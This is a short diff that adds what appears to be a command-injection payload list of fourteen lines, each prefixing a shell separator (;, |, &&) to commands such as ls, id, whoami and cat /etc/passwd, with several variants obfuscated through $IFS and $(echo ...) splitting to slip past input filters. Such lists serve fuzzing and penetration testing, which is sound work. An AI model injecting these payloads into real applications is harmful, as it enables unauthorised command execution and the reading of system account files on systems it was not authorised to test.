@@ -1,0 +1,14 @@
+; ls
+; cat /etc/passwd
+| id
+| whoami
+&& ls
+&& cat /etc/passwd
+&& whoami
+; l$s
+; cat$IFS/etc/passwd
+| i$(echo d)
+| wh$(echo oami)
+&& l$()s
+&& c$(echo at) /etc/passwd
+&& w$(echo hoami)
